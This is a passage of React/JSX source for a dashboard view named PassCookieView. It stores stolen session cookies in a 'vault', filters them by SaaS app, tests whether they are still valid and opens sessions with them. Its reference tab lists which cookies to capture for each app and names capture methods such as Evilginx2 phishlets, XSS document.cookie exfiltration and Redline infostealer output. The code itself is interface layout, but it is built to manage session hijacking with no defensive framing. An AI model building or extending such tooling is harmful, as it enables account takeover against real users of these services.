              onClick={() => setShowAdd(true)}>
              Add Cookies
            </Button>
          </Flex>
        </Flex>
      </MotionBox>

      <AnimatePresence mode="wait">

        {/* ── Vault tab ──────────────────────────────────────────────────── */}
        {tab === 'vault' && (
          <MotionBox key="vault" initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
            {/* App filter */}
            {entries.length > 0 && (
              <Flex gap={2} flexWrap="wrap" mb={4}>
                <Button size="xs" variant="ghost" borderRadius="6px"
                  color={filterApp === 'all' ? 'white' : 'var(--dash-text-muted)'}
                  bg={filterApp === 'all' ? 'rgba(255,255,255,0.1)' : 'rgba(255,255,255,0.04)'}
                  border={`1px solid ${filterApp === 'all' ? 'rgba(255,255,255,0.25)' : 'rgba(255,255,255,0.08)'}`}
                  onClick={() => setFilterApp('all')}>
                  All ({entries.length})
                </Button>
                {SAAS_APPS.filter((a) => entries.some((e) => e.app === a.key)).map((app) => {
                  const count = entries.filter((e) => e.app === app.key).length;
                  const validCount = entries.filter((e) => e.app === app.key && e.status === 'valid').length;
                  return (
                    <Button key={app.key} size="xs" variant="ghost" borderRadius="6px"
                      color={filterApp === app.key ? app.color : 'var(--dash-text-muted)'}
                      bg={filterApp === app.key ? `${app.color}18` : 'rgba(255,255,255,0.04)'}
                      border={`1px solid ${filterApp === app.key ? `${app.color}40` : 'rgba(255,255,255,0.08)'}`}
                      _hover={{ bg: `${app.color}12`, color: app.color }}
                      onClick={() => setFilterApp(app.key)}>
                      {app.label} ({count}){validCount > 0 && ` ✓${validCount}`}
                    </Button>
                  );
                })}
              </Flex>
            )}

            {filtered.length === 0 ? (
              <Box bg="rgba(255,255,255,0.02)" border="1px solid rgba(255,255,255,0.07)"
                borderRadius="16px" p={12} textAlign="center">
                <Box w="52px" h="52px" borderRadius="14px" bg={`${GREEN}15`} border={`1px solid ${GREEN}25`}
                  display="flex" alignItems="center" justifyContent="center" mx="auto" mb={4}>
                  <Box as="svg" w="26px" h="26px" viewBox="0 0 24 24" fill="none" stroke={GREEN} strokeWidth="1.5">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z" strokeDasharray="4 2"/>
                    <path d="M12 8v4l3 3"/>
                  </Box>
                </Box>
                <Text color="var(--dash-text-muted)" fontSize="sm" mb={3}>
                  No cookies in the vault yet.
                </Text>
                <Text fontSize="xs" color="var(--dash-text-muted)" mb={4}>
                  Capture cookies from XSS, MITM, Evilginx, infostealers, or browser extraction tools.
                </Text>
                <Button size="sm" borderRadius="8px"
                  bg={`${GREEN}20`} color={GREEN} border={`1px solid ${GREEN}40`}
                  _hover={{ bg: `${GREEN}30` }} leftIcon={<AddIcon boxSize={3} />}
                  onClick={() => setShowAdd(true)}>
                  Add First Cookie
                </Button>
              </Box>
            ) : (
              <Flex direction="column" gap={3}>
                {filtered.map((entry) => (
                  <CookieCard
                    key={entry.id}
                    entry={entry}
                    onDelete={deleteEntry}
                    onTest={testEntry}
                    onOpenSession={openSession}
                    testing={testing[entry.id]}
                  />
                ))}
              </Flex>
            )}
          </MotionBox>
        )}

        {/* ── Reference tab ──────────────────────────────────────────────── */}
        {tab === 'reference' && (
          <MotionBox key="reference" initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
            <SimpleGrid columns={{ base: 1, lg: 2 }} gap={4} alignItems="start">
              {SAAS_APPS.map((app) => (
                <MotionBox key={app.key} initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }}>
                  <Box bg="rgba(255,255,255,0.03)" border="1px solid rgba(255,255,255,0.07)"
                    borderRadius="14px" overflow="hidden">
                    <Box h="2px" bgGradient={`linear(to-r, ${app.color}, ${app.color}00)`} />
                    <Box p={4}>
                      <Flex align="center" gap={3} mb={3}>
                        <Flex w="36px" h="36px" borderRadius="10px"
                          bg="rgba(255,255,255,0.06)" border={`1px solid ${app.color}30`}
                          align="center" justify="center" flexShrink={0}>
                          {app.icon}
                        </Flex>
                        <Box>
                          <Text fontSize="13px" fontWeight="semibold" color="white">{app.label}</Text>
                          <Text fontSize="10px" color="var(--dash-text-muted)">{app.openUrl}</Text>
                        </Box>
                        <Button size="xs" ml="auto" borderRadius="6px" variant="ghost"
                          color={app.color} bg={`${app.color}15`} border={`1px solid ${app.color}30`}
                          _hover={{ bg: `${app.color}25` }}
                          onClick={() => { setShowAdd(true); }}>
                          + Add
                        </Button>
                      </Flex>

                      <Text fontSize="10px" color="var(--dash-text-muted)" textTransform="uppercase"
                        letterSpacing="wider" mb={2}>Key Cookies to Capture</Text>
                      <Flex gap={2} flexWrap="wrap" mb={3}>
                        {app.cookieHints.map((h) => (
                          <Flex key={h} align="center" gap={1}
                            px={2} py="3px" borderRadius="5px"
                            bg={`${app.color}12`} border={`1px solid ${app.color}25`}>
                            <Text fontSize="10px" fontFamily="monospace" color={app.color}>{h}</Text>
                            <CopyBtn text={h} />
                          </Flex>
                        ))}
                      </Flex>

                      <Text fontSize="10px" color="var(--dash-text-muted)" textTransform="uppercase"
                        letterSpacing="wider" mb={2}>Capture Methods</Text>
                      <Flex direction="column" gap={1}>
                        {[
                          'Browser DevTools → Application → Cookies',
                          'EditThisCookie / Cookie-Editor extension',
                          'Evilginx2 / Modlishka phishlet capture',
                          'JavaScript XSS: document.cookie exfil',
                          'Infostealer / Redline output parser',
                          'Burp Suite Cookie Jar export',
                        ].map((m) => (
                          <Flex key={m} align="center" gap={2}>
                            <Box w="4px" h="4px" borderRadius="full" bg={app.color} flexShrink={0} />
                            <Text fontSize="11px" color="var(--dash-text-secondary)">{m}</Text>
                          </Flex>
                        ))}
                      </Flex>
                    </Box>
                  </Box>
                </MotionBox>
              ))}
            </SimpleGrid>
          </MotionBox>
        )}

      </AnimatePresence>

      {showAdd && <AddCookieModal onClose={() => setShowAdd(false)} onAdd={addEntry} />}
    </Box>
  );
};

export default PassCookieView;
